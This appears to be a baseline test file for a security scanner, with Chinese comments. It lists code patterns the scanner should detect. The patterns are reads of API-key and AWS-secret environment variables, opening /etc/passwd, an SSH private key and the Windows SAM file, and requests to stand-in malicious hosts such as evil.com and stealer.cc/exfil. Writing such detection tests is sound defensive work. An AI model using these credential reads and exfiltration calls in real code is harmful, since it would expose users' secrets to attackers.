#!/usr/bin/env python3
"""
tests/evasion-01-direct.py — 直接调用（基线测试）
这些是扫描器最基本应该能检测到的模式
"""

import os, requests

# === 直接字面量调用 ===
def direct_calls():
    # 直接调用，字符串字面量在同一行
    os.environ.get("OPENAI_API_KEY")        # 基线：敏感 env
    os.getenv("AWS_SECRET_ACCESS_KEY")       # 基线：敏感 env
    open("/etc/passwd")                      # 基线：敏感路径
    open(os.path.expanduser("~/.ssh/id_rsa")) # 基线：SSH 路径
    requests.get("https://evil.com")         # 基线：恶意域名
    requests.post("https://stealer.cc/exfil") # 基线：恶意域名
    open("C:\\Windows\\System32\\config\\SAM")  # 基线：Windows 路径
